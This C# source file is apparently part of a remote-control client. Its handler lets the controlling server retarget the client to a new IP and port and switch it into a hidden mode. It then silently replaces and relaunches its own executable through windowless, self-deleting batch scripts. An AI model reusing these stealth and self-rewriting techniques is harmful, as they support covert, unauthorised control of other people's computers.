using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Reflection;
using System.Text;
using System.Threading;
using RemoteControl.Protocals;
using RemoteControl.Protocals.Request;
using RemoteControl.Protocals.Response;

namespace RemoteControl.Client.Handlers
{
    class RequestChangeConfigHandler : AbstractRequestHandler
    {
        public override void Handle(SocketSession session, ePacketType reqType, object reqObj)
        {
            RunTaskThread(() =>
            {
                var resp = new ResponseChangeConfig();
                try
                {
                    var req = reqObj as RequestChangeConfig;
                    if (req == null)
                    {
                        throw new ArgumentException("配置请求为空");
                    }
                    ValidateRequest(req);

                    string exePath = Assembly.GetEntryAssembly().Location;
                    string configuredPath = BuildConfiguredClient(exePath, req);

                    string copyError;
                    bool copiedInPlace = TryCopyConfiguredClient(configuredPath, exePath, out copyError);
                    if (!copiedInPlace && !req.RestartClient)
                    {
                        resp.Result = false;
                        resp.Message = "当前客户端文件正在运行，无法直接覆盖；请勾选重启后应用。";
                        resp.Detail = copyError;
                        session.Send(ePacketType.PACKET_CHANGE_CONFIG_RESPONSE, resp);
                        return;
                    }

                    resp.Result = true;
                    resp.ServerIP = req.ServerIP;
                    resp.ServerPort = req.ServerPort;
                    resp.ServiceName = req.ServiceName;
                    resp.OnlineAvatar = req.OnlineAvatar;
                    resp.IsHide = req.IsHide;
                    resp.RestartClient = req.RestartClient;
                    resp.Message = copiedInPlace
                        ? (req.RestartClient ? "配置已写入，客户端将重启" : "配置已写入客户端文件")
                        : "配置已写入，客户端将重启后替换";
                    session.Send(ePacketType.PACKET_CHANGE_CONFIG_RESPONSE, resp);

                    if (req.RestartClient)
                    {
                        if (copiedInPlace)
                        {
                            StartRestartScript(exePath);
                        }
                        else
                        {
                            StartReplaceScript(configuredPath, exePath);
                        }
                        Thread.Sleep(800);
                        Environment.Exit(0);
                    }
                }
                catch (Exception ex)
                {
                    resp.Result = false;
                    resp.Message = ex.Message;
                    session.Send(ePacketType.PACKET_CHANGE_CONFIG_RESPONSE, resp);
                }
            });
        }

        private static void ValidateRequest(RequestChangeConfig req)
        {
            IPAddress address;
            if (string.IsNullOrWhiteSpace(req.ServerIP) || !IPAddress.TryParse(req.ServerIP, out address))
            {
                throw new ArgumentException("服务器IP不正确");
            }
            if (req.ServerPort <= 0 || req.ServerPort > 65535)
            {
                throw new ArgumentException("服务器端口不正确");
            }
        }

        private static string BuildConfiguredClient(string exePath, RequestChangeConfig req)
        {
            byte[] sourceData = File.ReadAllBytes(exePath);
            if (sourceData.Length > 0xdc)
            {
                ClientParametersManager.WriteClientStyle(
                    sourceData,
                    req.IsHide ? ClientParametersManager.ClientStyle.Hidden : ClientParametersManager.ClientStyle.Normal);
            }

            ClientParameters para = ClientParametersManager.ReadParameters(exePath);
            para.InitHeader();
            para.SetServerIP(req.ServerIP);
            para.ServerPort = req.ServerPort;
            para.ServiceName = TrimFixedString(req.ServiceName, 23);
            para.OnlineAvatar = TrimFixedString(req.OnlineAvatar, 23);

            string dir = Path.GetDirectoryName(exePath);
            if (string.IsNullOrEmpty(dir))
            {
                dir = Path.GetTempPath();
            }
            string configuredPath = Path.Combine(dir, Path.GetFileName(exePath) + ".reconfig");
            ClientParametersManager.WriteParameters(sourceData, configuredPath, para);
            return configuredPath;
        }

        private static bool TryCopyConfiguredClient(string configuredPath, string exePath, out string copyError)
        {
            try
            {
                File.Copy(configuredPath, exePath, true);
                try { File.Delete(configuredPath); } catch { }
                copyError = "";
                return true;
            }
            catch (Exception ex)
            {
                copyError = ex.Message;
                return false;
            }
        }

        private static void StartReplaceScript(string configuredPath, string exePath)
        {
            string scriptPath = Path.Combine(Path.GetTempPath(), "rc_change_config_" + Guid.NewGuid().ToString("N") + ".bat");
            string script =
                "@echo off\r\n" +
                "ping 127.0.0.1 -n 3 > nul\r\n" +
                "copy /Y \"" + configuredPath + "\" \"" + exePath + "\" > nul\r\n" +
                "start \"\" \"" + exePath + "\" /r\r\n" +
                "del /F /Q \"" + configuredPath + "\" > nul 2>&1\r\n" +
                "del /F /Q \"%~f0\" > nul 2>&1\r\n";
            File.WriteAllText(scriptPath, script, Encoding.Default);

            ProcessStartInfo startInfo = new ProcessStartInfo("cmd.exe", "/c \"" + scriptPath + "\"");
            startInfo.CreateNoWindow = true;
            startInfo.UseShellExecute = false;
            Process.Start(startInfo);
        }

        private static void StartRestartScript(string exePath)
        {
            string scriptPath = Path.Combine(Path.GetTempPath(), "rc_restart_" + Guid.NewGuid().ToString("N") + ".bat");
            string script =
                "@echo off\r\n" +
                "ping 127.0.0.1 -n 3 > nul\r\n" +
                "start \"\" \"" + exePath + "\" /r\r\n" +
                "del /F /Q \"%~f0\" > nul 2>&1\r\n";
            File.WriteAllText(scriptPath, script, Encoding.Default);

            ProcessStartInfo startInfo = new ProcessStartInfo("cmd.exe", "/c \"" + scriptPath + "\"");
            startInfo.CreateNoWindow = true;
            startInfo.UseShellExecute = false;
            Process.Start(startInfo);
        }

        private static string TrimFixedString(string value, int maxLength)
        {
            if (value == null)
            {
                return "";
            }
            value = value.Trim();
            return value.Length > maxLength ? value.Substring(0, maxLength) : value;
        }
    }
}
